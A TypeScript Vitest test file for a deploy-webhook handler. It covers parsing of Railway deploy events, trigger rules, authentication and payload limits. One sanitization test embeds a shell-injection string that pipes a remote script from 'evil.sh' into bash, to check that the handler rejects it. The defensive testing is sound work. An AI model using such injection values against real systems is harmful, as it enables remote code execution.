import { describe, expect, it, vi } from 'vitest';
import { parseRailwayDeployEvent, shouldTriggerVerification } from '../lib/release-monitor/railwayWebhook';
import { __handleForTests } from '../app/api/internal/release-monitor/webhook/_handler';

describe('parseRailwayDeployEvent', () => {
  it('parses the top-level payload shape', () => {
    const e = parseRailwayDeployEvent({
      type: 'DEPLOY',
      status: 'SUCCESS',
      service: { name: 'vitalcv-web' },
      environment: { name: 'production' },
      deployment: { id: 'd1', meta: { commitHash: 'abc123' } },
      project: { id: 'p1' },
    });
    expect(e).toMatchObject({
      type: 'DEPLOY',
      status: 'SUCCESS',
      serviceName: 'vitalcv-web',
      environmentName: 'production',
      deploymentId: 'd1',
      commit: 'abc123',
      projectId: 'p1',
    });
  });

  it('parses a nested/drifted shape (status + service under deployment)', () => {
    const e = parseRailwayDeployEvent({ deployment: { status: 'SUCCESS', id: 'd2', service: { name: 'vitalcv-web' } } });
    expect(e?.status).toBe('SUCCESS');
    expect(e?.serviceName).toBe('vitalcv-web');
    expect(e?.deploymentId).toBe('d2');
  });

  it('returns null for non-deploy payloads', () => {
    expect(parseRailwayDeployEvent({})).toBeNull();
    expect(parseRailwayDeployEvent(null)).toBeNull();
    expect(parseRailwayDeployEvent('nope')).toBeNull();
  });
});

describe('shouldTriggerVerification', () => {
  const ev = (o: unknown) => parseRailwayDeployEvent(o);

  it('fires on a web SUCCESS deploy in production', () => {
    expect(
      shouldTriggerVerification(ev({ type: 'DEPLOY', status: 'SUCCESS', service: { name: 'vitalcv-web' }, environment: { name: 'production' } })).trigger,
    ).toBe(true);
  });

  it('skips non-SUCCESS statuses', () => {
    expect(shouldTriggerVerification(ev({ status: 'FAILED', service: { name: 'vitalcv-web' } })).trigger).toBe(false);
    expect(shouldTriggerVerification(ev({ status: 'BUILDING', service: { name: 'vitalcv-web' } })).trigger).toBe(false);
    expect(shouldTriggerVerification(ev({ status: 'CRASHED', service: { name: 'vitalcv-web' } })).trigger).toBe(false);
  });

  it('skips a different service or environment', () => {
    expect(shouldTriggerVerification(ev({ status: 'SUCCESS', service: { name: 'delightful-essence' } })).trigger).toBe(false);
    expect(
      shouldTriggerVerification(ev({ status: 'SUCCESS', service: { name: 'vitalcv-web' }, environment: { name: 'staging' } })).trigger,
    ).toBe(false);
  });

  it('biases to run when the service name is absent (payload drift)', () => {
    expect(shouldTriggerVerification(ev({ status: 'SUCCESS' })).trigger).toBe(true);
  });

  it('honors service/env overrides', () => {
    expect(
      shouldTriggerVerification(ev({ status: 'SUCCESS', service: { name: 'my-web' }, environment: { name: 'prod' } }), {
        webServiceName: 'my-web',
        environmentName: 'prod',
      }).trigger,
    ).toBe(true);
  });
});

describe('webhook handler', () => {
  const good = {
    type: 'DEPLOY',
    status: 'SUCCESS',
    service: { name: 'vitalcv-web' },
    environment: { name: 'production' },
    deployment: { id: 'd1', meta: { commitHash: 'abc1234def' } },
  };

  function req(body: unknown, opts: { bearer?: string; query?: string } = {}): Request {
    const url = 'https://vitalcv.com/api/internal/release-monitor/webhook' + (opts.query ?? '');
    const headers: Record<string, string> = { 'content-type': 'application/json' };
    if (opts.bearer) headers.authorization = `Bearer ${opts.bearer}`;
    return new Request(url, { method: 'POST', headers, body: JSON.stringify(body) });
  }

  it('401s an unauthenticated caller', async () => {
    const res = await __handleForTests(req(good), { env: { cronSecret: 'sekret' } });
    expect(res.status).toBe(401);
  });

  it('500s (fails closed) when no secret is configured', async () => {
    const res = await __handleForTests(req(good, { bearer: 'anything' }), { env: {} });
    expect(res.status).toBe(500);
  });

  it('accepts the ?token= query secret and dispatches on a web SUCCESS deploy', async () => {
    const dispatch = vi.fn().mockResolvedValue({ ok: true, status: 204, detail: 'dispatched' });
    const res = await __handleForTests(req(good, { query: '?token=sekret' }), {
      env: { releaseToken: 'sekret', githubToken: 'ght' },
      dispatch,
    });
    expect(res.status).toBe(202);
    expect(dispatch).toHaveBeenCalledOnce();
    expect(dispatch.mock.calls[0][0]).toMatchObject({ token: 'ght', clientPayload: { commit: 'abc1234def', deploymentId: 'd1' } });
  });

  it('sanitizes untrusted payload fields before dispatch (non-hex commit → null, strings truncated)', async () => {
    const dispatch = vi.fn().mockResolvedValue({ ok: true, status: 204, detail: 'dispatched' });
    const evil = {
      ...good,
      deployment: { id: 'x'.repeat(500), meta: { commitHash: '"; curl evil.sh | bash; echo "' } },
    };
    const res = await __handleForTests(req(evil, { bearer: 'sekret' }), {
      env: { cronSecret: 'sekret', githubToken: 'ght' },
      dispatch,
    });
    expect(res.status).toBe(202);
    const payload = dispatch.mock.calls[0][0].clientPayload as Record<string, string | null>;
    expect(payload.commit).toBeNull(); // shell metacharacters are not a hex SHA
    expect(payload.deploymentId?.length).toBeLessThanOrEqual(200);
  });

  it('413s an oversized body without dispatching', async () => {
    const dispatch = vi.fn();
    const big = { ...good, junk: 'z'.repeat(150_000) };
    const res = await __handleForTests(req(big, { bearer: 'sekret' }), {
      env: { cronSecret: 'sekret', githubToken: 'ght' },
      dispatch,
    });
    expect(res.status).toBe(413);
    expect(dispatch).not.toHaveBeenCalled();
  });

  it('200 no-op (no dispatch) on a non-SUCCESS event', async () => {
    const dispatch = vi.fn();
    const res = await __handleForTests(req({ status: 'FAILED', service: { name: 'vitalcv-web' } }, { bearer: 'sekret' }), {
      env: { cronSecret: 'sekret', githubToken: 'ght' },
      dispatch,
    });
    expect(res.status).toBe(200);
    expect(dispatch).not.toHaveBeenCalled();
  });

  it('500s a valid trigger when GITHUB_DISPATCH_TOKEN is missing', async () => {
    const res = await __handleForTests(req(good, { bearer: 'sekret' }), { env: { cronSecret: 'sekret' } });
    expect(res.status).toBe(500);
  });

  it('502s when the dispatch itself fails', async () => {
    const dispatch = vi.fn().mockResolvedValue({ ok: false, status: 403, detail: 'bad token' });
    const res = await __handleForTests(req(good, { bearer: 'sekret' }), {
      env: { cronSecret: 'sekret', githubToken: 'ght' },
      dispatch,
    });
    expect(res.status).toBe(502);
  });
});
